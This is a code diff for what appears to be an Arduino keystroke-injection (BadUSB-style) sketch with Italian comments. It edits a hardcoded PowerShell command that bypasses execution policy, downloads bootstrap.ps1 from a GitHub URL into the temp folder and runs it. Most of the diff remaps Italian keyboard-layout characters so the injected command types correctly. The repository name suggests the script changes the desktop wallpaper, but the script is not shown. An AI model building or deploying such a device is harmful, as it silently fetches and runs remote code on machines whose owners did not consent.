@@ -5,7 +5,7 @@
 // ── MODIFICA SOLO QUESTA RIGA ─────────────────────────────────────────────────
 static const char URL[] =
     "powershell -ExecutionPolicy Bypass -Command "
-    "\"iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1'|iex\"";
+    "\"$f=\\\"$env:TEMP\\\\bootstrap.ps1\\\"; iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1' -o $f; & $f; Read-Host 'Premi INVIO'\"";
 // ────────────────────────────────────────────────────────────────────────────
 
 static constexpr uint32_t DELAY_HID_INIT   = 8000U;
@@ -40,10 +40,29 @@ static void pressCombo(uint8_t k1, uint8_t k2 = 0) {
 
 static void typeCharIT(char c) {
     switch (c) {
+        case '$':
+            // Simbolo del dollaro in IT = Shift+4
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press('4'); delay(50); Keyboard.releaseAll();
+            break;
+        case '&':
+            // E commerciale in IT = Shift+6
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press('6'); delay(50); Keyboard.releaseAll();
+            break;
+        case '=':
+            // Uguale in IT = tasto [=] (a destra del trattino)
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press('0'); delay(50); Keyboard.releaseAll();
+            break;
+        case ';':
+            // Punto e virgola in IT = Shift+','
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press(','); delay(50); Keyboard.releaseAll();
+            break;
         case '\'':
             // Apostrofo in IT = tasto accento grave (a sinistra dell'1)
-            Keyboard.press(KEY_LEFT_SHIFT);
-            Keyboard.press('\''); delay(50); Keyboard.releaseAll();
+            Keyboard.press('-'); delay(50); Keyboard.releaseAll();
             break;
         case '"':
             // Virgolette in IT = Shift+2
@@ -57,22 +76,26 @@ static void typeCharIT(char c) {
             break;
         case '\\':
             // Backslash in IT = Alt Gr + (il tasto che digita \)
-            Keyboard.press(KEY_RIGHT_ALT);
-            Keyboard.press(KEY_RIGHT_SHIFT); delay(50); Keyboard.releaseAll();
+            Keyboard.press('`'); 
+            delay(50); 
+            Keyboard.releaseAll();
+
             break;
         case '|':
             // Pipe in IT = Alt Gr + (il tasto che digita \)
-            Keyboard.press(KEY_RIGHT_ALT);
-            Keyboard.press(KEY_RIGHT_SHIFT); delay(50); Keyboard.releaseAll();
+            Keyboard.press(KEY_RIGHT_SHIFT); 
+            Keyboard.press('~');
+            delay(50); 
+            Keyboard.releaseAll();
             break;
         case '-':
             // Trattino in IT = tasto [-] (a destra dello 0)
-            Keyboard.press('-'); delay(50); Keyboard.releaseAll();
+            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
             break;
         case '_':
             // Underscore in IT = Shift+[-]
             Keyboard.press(KEY_LEFT_SHIFT);
-            Keyboard.press('-'); delay(50); Keyboard.releaseAll();
+            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
             break;
         case ':':
             // Due punti in IT = Shift+'.'
